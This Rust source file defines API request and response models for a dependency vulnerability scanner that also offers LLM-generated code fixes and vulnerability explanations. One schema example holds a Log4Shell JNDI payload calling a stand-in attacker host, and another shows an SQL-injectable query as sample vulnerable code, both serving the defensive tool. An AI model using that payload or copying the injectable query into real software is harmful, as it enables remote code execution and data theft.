//! API request and response models

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use utoipa::ToSchema;
use uuid::Uuid;

use crate::domain::value_objects::{AnalysisDepth, SourceType};

/// Request model for orchestrator job-based analysis
#[derive(Deserialize, ToSchema)]
pub struct AnalysisRequest {
    /// Source type (git, file_upload, s3_bucket, directory)
    #[schema(example = "git")]
    pub source_type: String,

    /// Source URI (repository URL, file path, etc.)
    #[schema(example = "https://github.com/my-org/my-project.git")]
    pub source_uri: String,

    /// Analysis depth
    #[schema(example = "full")]
    pub analysis_depth: String,

    /// Optional callback URL for async results
    #[schema(example = "https://my-ci-cd.com/webhook/123")]
    pub callback_url: Option<String>,
}

/// Request model for dependency file analysis
#[derive(Deserialize, ToSchema)]
pub struct DependencyAnalysisRequest {
    /// The dependency file content to analyze for vulnerabilities
    #[schema(
        example = r#"{"dependencies": {"express": "4.17.1", "lodash": "4.17.21", "axios": "0.21.0"}}"#
    )]
    pub file_content: String,

    /// The package ecosystem type
    #[schema(example = "npm")]
    pub ecosystem: String,

    /// Optional filename for automatic ecosystem detection
    #[schema(example = "package.json")]
    pub filename: Option<String>,
}

/// Response model for analysis job creation
#[derive(Serialize, ToSchema)]
pub struct JobAnalysisResponse {
    /// Job ID for tracking
    #[schema(example = "550e8400-e29b-41d4-a716-446655440000")]
    pub job_id: Uuid,

    /// Job status
    #[schema(example = "Pending")]
    pub status: String,

    /// Message
    #[schema(example = "Analysis job created")]
    pub message: String,
}

/// Response model for dependency analysis results
#[derive(Serialize, ToSchema)]
pub struct AnalysisResponse {
    /// Unique analysis ID for tracking and retrieval
    #[schema(example = "550e8400-e29b-41d4-a716-446655440000")]
    pub id: Uuid,

    /// List of vulnerabilities found in the analyzed dependencies
    pub vulnerabilities: Vec<VulnerabilityDto>,

    /// Comprehensive analysis metadata and statistics
    pub metadata: AnalysisMetadataDto,
    /// Optional per-package version recommendations
    pub version_recommendations: Option<Vec<VersionRecommendationDto>>,

    /// Pagination information for large result sets
    pub pagination: PaginationDto,
}

/// Module execution result
#[derive(Serialize, ToSchema)]
pub struct ModuleResultDto {
    pub module_type: String,
    pub status: String,
    pub files_scanned: usize,
    pub duration_ms: u64,
    pub findings_count: usize,
    pub metadata: Option<serde_json::Value>,
    pub error: Option<String>,
}

/// Job status response
#[derive(Serialize, ToSchema)]
pub struct JobStatusResponse {
    pub job_id: Uuid,
    pub project_id: String,
    pub status: String,
    pub summary: crate::domain::entities::Summary,
    pub created_at: String,
    pub started_at: Option<String>,
    pub completed_at: Option<String>,
    pub error: Option<String>,
    pub callback_url: Option<String>,
    pub invocation_context: Option<JobInvocationContextDto>,

    pub modules: Vec<ModuleResultDto>,
    pub findings_by_type: crate::domain::entities::FindingsByType,
}

/// Response returned when a job is accepted for asynchronous processing
#[derive(Serialize, ToSchema)]
pub struct JobAcceptedResponse {
    pub job_id: Uuid,
    pub status: String,
    pub callback_url: Option<String>,
    pub message: String,
}

/// Sanitized view of the invocation context for API responses
#[derive(Serialize, ToSchema)]
pub struct JobInvocationContextDto {
    pub user_id: Option<String>,
    pub email: Option<String>,
    pub auth_strategy: Option<String>,
    pub api_key_id: Option<String>,
}

impl From<crate::domain::entities::JobInvocationContext> for JobInvocationContextDto {
    fn from(context: crate::domain::entities::JobInvocationContext) -> Self {
        use crate::domain::entities::JobAuthStrategy;

        Self {
            user_id: context.user_id.map(|id| id.as_str()),
            email: context.email.map(|email| email.into_string()),
            auth_strategy: context.auth_strategy.map(|strategy| match strategy {
                JobAuthStrategy::Jwt => "jwt".to_string(),
                JobAuthStrategy::ApiKey => "api_key".to_string(),
            }),
            api_key_id: context.api_key_id.map(|id| id.as_str()),
        }
    }
}

/// Final report response
#[derive(Serialize, ToSchema)]
pub struct FinalReportResponse {
    pub job_id: Uuid,
    pub status: String,
    pub summary: crate::domain::entities::Summary,
    pub findings_by_type: crate::domain::entities::FindingsByType,
}

impl AnalysisRequest {
    pub fn parse_source_type(&self) -> Result<SourceType, String> {
        match self.source_type.to_lowercase().as_str() {
            "git" => Ok(SourceType::Git),
            "file_upload" => Ok(SourceType::FileUpload),
            "s3_bucket" => Ok(SourceType::S3Bucket),
            "directory" => Ok(SourceType::Directory),
            _ => Err(format!("Invalid source_type: {}", self.source_type)),
        }
    }

    pub fn parse_analysis_depth(&self) -> Result<AnalysisDepth, String> {
        match self.analysis_depth.to_lowercase().as_str() {
            "full" => Ok(AnalysisDepth::Full),
            "dependencies_only" => Ok(AnalysisDepth::DependenciesOnly),
            "fast_scan" => Ok(AnalysisDepth::FastScan),
            _ => Err(format!("Invalid analysis_depth: {}", self.analysis_depth)),
        }
    }
}

/// Error response model
#[derive(Serialize, ToSchema)]
pub struct ErrorResponse {
    /// Machine-readable error code
    #[schema(example = "PARSE_ERROR")]
    pub code: String,

    /// Human-readable error message
    #[schema(example = "Failed to parse dependency file: Invalid JSON format")]
    pub message: String,

    /// Additional error context and debugging information
    #[schema(example = r#"{"field": "file_content", "line": 5, "column": 12}"#)]
    pub details: Option<serde_json::Value>,

    /// Unique request identifier for tracking and support
    #[schema(example = "req_550e8400-e29b-41d4-a716-446655440000")]
    pub request_id: Uuid,

    /// Error occurrence timestamp
    #[schema(example = "2024-01-15T10:30:00Z")]
    pub timestamp: DateTime<Utc>,
}

/// Health check response
#[derive(Serialize, ToSchema)]
pub struct HealthResponse {
    /// Overall service health status
    #[schema(example = "healthy")]
    pub status: String,

    /// Current service version
    #[schema(example = "1.0.0")]
    pub version: String,

    /// Health check timestamp
    #[schema(example = "2024-01-15T10:30:00Z")]
    pub timestamp: DateTime<Utc>,

    /// Detailed health information and dependency status
    #[schema(
        example = r#"{"dependencies": {"cache": {"status": "healthy"}, "external_apis": {"osv": "healthy", "nvd": "healthy"}}}"#
    )]
    pub details: Option<serde_json::Value>,
}

/// DTO for vulnerability information
#[derive(Serialize, ToSchema)]
pub struct VulnerabilityDto {
    /// Unique vulnerability identifier (CVE, GHSA, etc.)
    #[schema(example = "CVE-2021-23337")]
    pub id: String,

    /// Brief vulnerability summary
    #[schema(example = "Prototype Pollution in lodash")]
    pub summary: String,

    /// Detailed vulnerability description
    #[schema(
        example = "lodash versions prior to 4.17.21 are vulnerable to Prototype Pollution via the zipObjectDeep function."
    )]
    pub description: String,

    /// Severity level of the vulnerability
    #[schema(example = "High")]
    pub severity: String,

    /// List of packages affected by this vulnerability
    pub affected_packages: Vec<AffectedPackageDto>,

    /// Reference URLs for more information
    #[schema(
        example = r#"["https://nvd.nist.gov/vuln/detail/CVE-2021-23337", "https://github.com/advisories/GHSA-35jh-r3h4-6jhm"]"#
    )]
    pub references: Vec<String>,

    /// Vulnerability publication date
    #[schema(example = "2021-02-15T10:30:00Z")]
    pub published_at: DateTime<Utc>,

    /// Data sources that provided this vulnerability information
    #[schema(example = r#"["OSV", "NVD", "GHSA"]"#)]
    pub sources: Vec<String>,
}

/// DTO for affected package information
#[derive(Serialize, ToSchema)]
pub struct AffectedPackageDto {
    /// Package name in the ecosystem
    #[schema(example = "lodash")]
    pub name: String,

    /// Current package version found in dependencies
    #[schema(example = "4.17.20")]
    pub version: String,

    /// Package ecosystem
    #[schema(example = "npm")]
    pub ecosystem: String,

    /// Version ranges affected by the vulnerability
    #[schema(example = r#"["< 4.17.21", ">= 4.0.0"]"#)]
    pub vulnerable_ranges: Vec<String>,

    /// Versions that fix the vulnerability
    #[schema(example = r#"["4.17.21", "5.0.0"]"#)]
    pub fixed_versions: Vec<String>,
}

/// DTO for analysis metadata
#[derive(Serialize, ToSchema)]
pub struct AnalysisMetadataDto {
    /// Total number of packages analyzed from the dependency file
    #[schema(example = 25)]
    pub total_packages: usize,

    /// Number of packages with known vulnerabilities
    #[schema(example = 3)]
    pub vulnerable_packages: usize,

    /// Total number of unique vulnerabilities discovered
    #[schema(example = 5)]
    pub total_vulnerabilities: usize,

    /// Vulnerability count breakdown by severity level
    pub severity_breakdown: SeverityBreakdownDto,

    /// Time taken to complete the analysis in milliseconds
    #[schema(example = 1250)]
    pub analysis_duration_ms: u64,

    /// List of vulnerability databases that were consulted
    #[schema(example = r#"["OSV", "NVD", "GHSA"]"#)]
    pub sources_queried: Vec<String>,
}

/// DTO for severity breakdown
#[derive(Serialize, ToSchema)]
pub struct SeverityBreakdownDto {
    /// Number of critical severity vulnerabilities
    #[schema(example = 1)]
    pub critical: usize,

    /// Number of high severity vulnerabilities
    #[schema(example = 2)]
    pub high: usize,

    /// Number of medium severity vulnerabilities
    #[schema(example = 1)]
    pub medium: usize,

    /// Number of low severity vulnerabilities
    #[schema(example = 1)]
    pub low: usize,
}

/// DTO for pagination information
#[derive(Serialize, ToSchema)]
pub struct PaginationDto {
    /// Current page number (1-based indexing)
    #[schema(example = 1, minimum = 1)]
    pub page: u32,

    /// Number of items per page
    #[schema(example = 50, minimum = 1, maximum = 500)]
    pub per_page: u32,

    /// Total number of items across all pages
    #[schema(example = 150)]
    pub total: u64,

    /// Total number of pages available
    #[schema(example = 3)]
    pub total_pages: u32,

    /// Whether there are additional pages after the current one
    #[schema(example = true)]
    pub has_next: bool,

    /// Whether there are pages before the current one
    #[schema(example = false)]
    pub has_prev: bool,
}

/// Response for vulnerability listing
#[derive(Serialize, ToSchema)]
pub struct VulnerabilityListResponse {
    /// Array of vulnerability details matching the query criteria
    pub vulnerabilities: Vec<VulnerabilityDto>,

    /// Total count of items available across all pages
    #[schema(example = 150)]
    pub total_count: u64,

    /// Cache status for the request
    #[schema(example = "hit")]
    pub cache_status: String,

    /// Pagination metadata for navigating through results
    pub pagination: PaginationDto,
}

#[derive(serde::Serialize, serde::Deserialize, utoipa::ToSchema)]
pub struct VersionRecommendationDto {
    /// Package name
    #[schema(example = "express")]
    pub package: String,

    /// Ecosystem identifier
    #[schema(example = "npm")]
    pub ecosystem: String,

    /// Current version found (if known)
    #[schema(example = "4.17.1")]
    pub current_version: Option<String>,

    /// Minimal safe version greater than or equal to current (if available)
    #[schema(example = "4.18.0")]
    pub nearest_safe_above_current: Option<String>,

    /// Newest safe version available (may equal nearest)
    #[schema(example = "4.19.2")]
    pub most_up_to_date_safe: Option<String>,

    /// Next safe version within the current major (if available)
    #[schema(example = "4.18.5")]
    pub next_safe_minor_within_current_major: Option<String>,

    /// Impact classification for the nearest recommendation (major/minor/patch/unknown)
    #[schema(example = "minor")]
    pub nearest_impact: Option<String>,

    /// Impact classification for the most up-to-date recommendation (major/minor/patch/unknown)
    #[schema(example = "major")]
    pub most_up_to_date_impact: Option<String>,

    /// Whether prereleases were excluded by configuration when computing recommendations
    #[schema(example = false)]
    pub prerelease_exclusion_applied: Option<bool>,

    /// Notes about recommendation (e.g., prerelease chosen, registry unavailable)
    pub notes: Option<Vec<String>>,
}

/// Request for analyzing an entire GitHub repository's dependency manifests
#[derive(Deserialize, ToSchema)]
pub struct RepositoryAnalysisRequest {
    /// Full repository URL (preferred). Examples:
    /// https://github.com/owner/repo, git@github.com:owner/repo.git, https://github.com/owner/repo/tree/main
    #[schema(example = "https://github.com/rust-lang/cargo")]
    pub repository_url: Option<String>,

    /// Optional explicit owner (used if repository_url not provided)
    #[schema(example = "rust-lang")]
    pub owner: Option<String>,

    /// Optional explicit repo name (used if repository_url not provided)
    #[schema(example = "cargo")]
    pub repo: Option<String>,

    /// Optional ref (branch, tag, or commit SHA). Overrides any ref derivable from the URL.
    #[schema(example = "main")]
    pub r#ref: Option<String>,

    /// Limit analysis to these path prefixes (case-sensitive)
    #[schema(example = "[\"crates/\", \"src/\"]")]
    pub include_paths: Option<Vec<String>>,

    /// Exclude these path prefixes
    #[schema(example = "[\"tests/\"]")]
    pub exclude_paths: Option<Vec<String>>,

    /// Client-requested max files (clamped by server config)
    #[schema(example = 100)]
    pub max_files: Option<u32>,

    /// Whether to include lockfiles (package-lock.json, yarn.lock, Cargo.lock, etc.)
    #[schema(example = true, default = true)]
    pub include_lockfiles: Option<bool>,

    /// Include per-file package listings in response
    #[schema(example = false, default = false)]
    pub return_packages: Option<bool>,
}

/// Per-file result in repository analysis
#[derive(Serialize, ToSchema)]
pub struct RepositoryFileResultDto {
    #[schema(example = "package.json")]
    pub path: String,
    #[schema(example = "npm")]
    pub ecosystem: Option<String>,
    #[schema(example = 12)]
    pub packages_count: u32,
    pub packages: Option<Vec<RepositoryPackageDto>>,
    #[schema(example = "ParseError: invalid syntax")]
    pub error: Option<String>,
}

/// Package reference within a repository analysis
#[derive(Serialize, ToSchema)]
pub struct RepositoryPackageDto {
    #[schema(example = "lodash")]
    pub name: String,
    #[schema(example = "4.17.21")]
    pub version: String,
    #[schema(example = "npm")]
    pub ecosystem: String,
}

/// Metadata describing repository analysis execution
#[derive(Serialize, ToSchema)]
pub struct RepositoryAnalysisMetadataDto {
    #[schema(example = 42)]
    pub total_files_scanned: u32,
    #[schema(example = 35)]
    pub analyzed_files: u32,
    #[schema(example = 7)]
    pub skipped_files: u32,
    #[schema(example = 120)]
    pub unique_packages: u32,
    #[schema(example = 18)]
    pub total_vulnerabilities: u32,
    pub severity_breakdown: SeverityBreakdownDto,
    #[schema(example = 2500)]
    pub duration_ms: u64,
    #[schema(example = 3)]
    pub file_errors: u32,
    #[schema(example = 4999)]
    pub rate_limit_remaining: Option<u32>,
    #[schema(example = false)]
    pub truncated: bool,
    pub config_caps: RepositoryConfigCapsDto,
}

/// Server enforced caps included for transparency
#[derive(Serialize, ToSchema)]
pub struct RepositoryConfigCapsDto {
    #[schema(example = 200)]
    pub max_files_scanned: u32,
    #[schema(example = 2000000)]
    pub max_total_bytes: u64,
}

/// Main response for repository analysis
#[derive(Serialize, ToSchema)]
pub struct RepositoryAnalysisResponse {
    #[schema(example = "550e8400-e29b-41d4-a716-446655440000")]
    pub id: Uuid,
    pub repository: RepositoryDescriptorDto,
    pub files: Vec<RepositoryFileResultDto>,
    pub vulnerabilities: Vec<VulnerabilityDto>,
    pub metadata: RepositoryAnalysisMetadataDto,
    pub version_recommendations: Option<Vec<VersionRecommendationDto>>,
}

/// Repository identification descriptor
#[derive(Serialize, ToSchema)]
pub struct RepositoryDescriptorDto {
    #[schema(example = "rust-lang")]
    pub owner: String,
    #[schema(example = "cargo")]
    pub repo: String,
    #[schema(example = "main")]
    pub requested_ref: Option<String>,
    #[schema(example = "a1b2c3d4e5f6g7h8i9j0")]
    pub commit_sha: String,
    #[schema(example = "https://github.com/rust-lang/cargo")]
    pub source_url: Option<String>,
}

/// Request for a single dependency file in batch analysis
#[derive(Deserialize, ToSchema)]
pub struct DependencyFileRequest {
    /// The dependency file content to analyze
    #[schema(example = r#"{"dependencies": {"express": "4.17.1", "lodash": "4.17.21"}}"#)]
    pub file_content: String,

    /// The package ecosystem type
    #[schema(example = "npm")]
    pub ecosystem: String,

    /// Optional filename for automatic ecosystem detection
    #[schema(example = "package.json")]
    pub filename: Option<String>,

    /// Optional workspace path for better context (extension usage)
    #[schema(example = "/workspace/frontend")]
    pub workspace_path: Option<String>,
}

/// Batch dependency analysis request
#[derive(Deserialize, ToSchema)]
pub struct BatchDependencyAnalysisRequest {
    /// List of dependency files to analyze
    pub files: Vec<DependencyFileRequest>,

    /// Enable caching of results (default: true, useful for extensions)
    #[serde(default = "default_true")]
    pub enable_cache: bool,

    /// Return minimal data for faster responses (extension mode)
    #[serde(default)]
    pub compact_mode: bool,
}

fn default_true() -> bool {
    true
}

/// Package DTO for response
#[derive(Serialize, ToSchema)]
pub struct PackageDto {
    /// Package name
    #[schema(example = "express")]
    pub name: String,

    /// Package version
    #[schema(example = "4.17.1")]
    pub version: String,

    /// Package ecosystem
    #[schema(example = "npm")]
    pub ecosystem: String,
}

/// Dependency graph node DTO
#[derive(Serialize, ToSchema)]
pub struct DependencyGraphNodeDto {
    /// Package information
    pub package: PackageDto,

    /// Direct dependencies (package IDs)
    pub dependencies: Vec<String>,

    /// Whether this is a direct dependency
    pub is_direct: bool,
}

/// Dependency graph edge DTO
#[derive(Serialize, ToSchema)]
pub struct DependencyGraphEdgeDto {
    /// Source package ID
    #[schema(example = "npm:express@4.17.1")]
    pub from: String,

    /// Target package ID
    #[schema(example = "npm:body-parser@1.19.0")]
    pub to: String,

    /// Whether this is a transitive dependency
    pub is_transitive: bool,
}

/// Dependency graph DTO
#[derive(Serialize, ToSchema)]
pub struct DependencyGraphDto {
    /// All nodes in the graph
    pub nodes: Vec<DependencyGraphNodeDto>,

    /// All edges in the graph
    pub edges: Vec<DependencyGraphEdgeDto>,

    /// Total number of packages
    pub package_count: usize,

    /// Total number of dependencies
    pub dependency_count: usize,
}

/// Result for a single file analysis
#[derive(Serialize, ToSchema)]
pub struct FileAnalysisResult {
    /// Optional filename
    #[schema(example = "package.json")]
    pub filename: Option<String>,

    /// Ecosystem detected/used
    #[schema(example = "npm")]
    pub ecosystem: String,

    /// List of vulnerabilities (always included)
    pub vulnerabilities: Vec<VulnerabilityDto>,

    /// List of packages (included if detail_level >= standard)
    pub packages: Option<Vec<PackageDto>>,

    /// Dependency graph (included if detail_level == full)
    pub dependency_graph: Option<DependencyGraphDto>,

    /// Version recommendations (included if detail_level >= standard)
    pub version_recommendations: Option<Vec<VersionRecommendationDto>>,

    /// Analysis metadata
    pub metadata: AnalysisMetadataDto,

    /// Error message if analysis failed
    pub error: Option<String>,

    /// Whether results were served from cache
    #[serde(skip_serializing_if = "Option::is_none")]
    pub cache_hit: Option<bool>,

    /// Workspace-relative path (if provided)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub workspace_path: Option<String>,
}

/// Batch analysis metadata
#[derive(Serialize, ToSchema)]
pub struct BatchAnalysisMetadata {
    /// Total number of files analyzed
    #[schema(example = 5)]
    pub total_files: usize,

    /// Number of successful analyses
    #[schema(example = 4)]
    pub successful: usize,

    /// Number of failed analyses
    #[schema(example = 1)]
    pub failed: usize,

    /// Total analysis duration in milliseconds
    #[schema(example = 2500)]
    pub duration_ms: u64,

    /// Total vulnerabilities found across all files
    #[schema(example = 12)]
    pub total_vulnerabilities: usize,

    /// Total packages analyzed across all files
    #[schema(example = 45)]
    pub total_packages: usize,

    /// Number of results served from cache
    #[serde(skip_serializing_if = "Option::is_none")]
    pub cache_hits: Option<usize>,

    /// Critical vulnerabilities count (quick reference for extensions)
    pub critical_count: usize,

    /// High vulnerabilities count (quick reference for extensions)
    pub high_count: usize,
}

/// Batch dependency analysis response
#[derive(Serialize, ToSchema)]
pub struct BatchDependencyAnalysisResponse {
    /// Results for each file (one per input file)
    pub results: Vec<FileAnalysisResult>,

    /// Batch analysis metadata
    pub metadata: BatchAnalysisMetadata,
}

/// Request for generating a code fix
#[derive(Deserialize, ToSchema)]
pub struct GenerateCodeFixRequest {
    /// The vulnerability ID (e.g., CVE-2021-44228)
    #[schema(example = "CVE-2021-44228")]
    pub vulnerability_id: String,

    /// The vulnerable code snippet
    #[schema(example = "logger.error(\"${jndi:ldap://attacker.com/a}\");")]
    pub vulnerable_code: String,

    /// The programming language
    #[schema(example = "java")]
    pub language: String,

    /// Additional context (e.g., surrounding code, file path)
    #[schema(example = "src/main/java/com/example/App.java")]
    pub context: Option<String>,
}

/// Response for code fix generation
#[derive(Serialize, ToSchema)]
pub struct CodeFixResponse {
    /// The suggested fix code
    #[schema(example = "logger.error(\"User input: {}\", sanitizedInput);")]
    pub fixed_code: String,

    /// Explanation of the fix
    #[schema(
        example = "Replaced direct string concatenation with parameterized logging to prevent injection."
    )]
    pub explanation: String,

    /// Confidence score (0.0 - 1.0)
    #[schema(example = 0.95)]
    pub confidence: f32,
}

/// Request for explaining a vulnerability
#[derive(Deserialize, ToSchema)]
pub struct ExplainVulnerabilityRequest {
    /// The vulnerability ID
    #[schema(example = "CVE-2021-44228")]
    pub vulnerability_id: String,

    /// The vulnerability description or summary
    #[schema(
        example = "Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints."
    )]
    pub description: String,

    /// The affected package/component
    #[schema(example = "org.apache.logging.log4j:log4j-core")]
    pub affected_component: String,

    /// Target audience level (technical, non-technical, executive)
    #[schema(example = "technical")]
    pub audience: Option<String>,
}

/// Response for vulnerability explanation
#[derive(Serialize, ToSchema)]
pub struct ExplanationResponse {
    /// The explanation text
    #[schema(example = "This vulnerability allows remote code execution because...")]
    pub explanation: String,

    /// Key takeaways or summary points
    #[schema(example = json!(["Remote Code Execution", "JNDI Injection", "Critical Severity"]))]
    pub key_points: Vec<String>,

    /// Recommended mitigation steps
    #[schema(example = json!(["Upgrade to version 2.15.0", "Disable JNDI lookup"]))]
    pub mitigation_steps: Vec<String>,
}

/// Request for natural language query
#[derive(Deserialize, ToSchema)]
pub struct NaturalLanguageQueryRequest {
    /// The user's query
    #[schema(example = "How do I fix the SQL injection in login.php?")]
    pub query: String,

    /// Context (e.g., project ID, file content)
    #[schema(example = "{\"file\": \"login.php\", \"content\": \"...\"}")]
    pub context: Option<serde_json::Value>,
}

/// Response for natural language query
#[derive(Serialize, ToSchema)]
pub struct NaturalLanguageQueryResponse {
    /// The answer to the query
    #[schema(example = "To fix the SQL injection, you should use prepared statements...")]
    pub answer: String,

    /// Related resources or links
    #[schema(example = json!(["https://owasp.org/www-community/attacks/SQL_Injection"]))]
    pub references: Vec<String>,
}

/// Request for enriching job findings with LLM insights
#[derive(Deserialize, ToSchema)]
pub struct EnrichFindingsRequest {
    /// Optional list of specific finding IDs to enrich (if empty, prioritizes by severity)
    #[schema(example = json!(["finding_123", "finding_456"]))]
    pub finding_ids: Option<Vec<String>>,

    /// Optional code context per finding ID (for more accurate suggestions)
    #[schema(example = json!({"finding_123": "def login(user, password):\n    query = f\"SELECT * FROM users WHERE user='{user}'\""}), default)]
    pub code_contexts: Option<std::collections::HashMap<String, String>>,
}

/// Response for findings enrichment
#[derive(Serialize, ToSchema)]
pub struct EnrichFindingsResponse {
    /// Job ID that was enriched
    #[schema(example = "550e8400-e29b-41d4-a716-446655440000")]
    pub job_id: Uuid,

    /// Number of findings successfully enriched
    #[schema(example = 5)]
    pub enriched_count: usize,

    /// Number of findings that failed enrichment
    #[schema(example = 1)]
    pub failed_count: usize,

    /// Enriched findings with LLM-generated insights
    pub findings: Vec<EnrichedFindingDto>,
}

/// DTO for enriched finding
#[derive(Serialize, ToSchema)]
pub struct EnrichedFindingDto {
    /// Finding ID
    #[schema(example = "finding_123")]
    pub id: String,

    /// Finding severity
    #[schema(example = "Critical")]
    pub severity: String,

    /// Finding description
    #[schema(example = "SQL Injection vulnerability detected")]
    pub description: String,

    /// Location (file:line:column)
    #[schema(example = "src/auth.py:42:10")]
    pub location: String,

    /// LLM-generated explanation
    #[schema(example = "This SQL injection vulnerability allows attackers to...")]
    pub explanation: Option<String>,

    /// LLM-generated remediation suggestion
    #[schema(example = "Use parameterized queries or an ORM...")]
    pub remediation_suggestion: Option<String>,

    /// Risk summary
    #[schema(example = "High risk: potential data breach")]
    pub risk_summary: Option<String>,

    /// Whether enrichment was successful
    pub enrichment_successful: bool,

    /// Error message if enrichment failed
    pub enrichment_error: Option<String>,
}
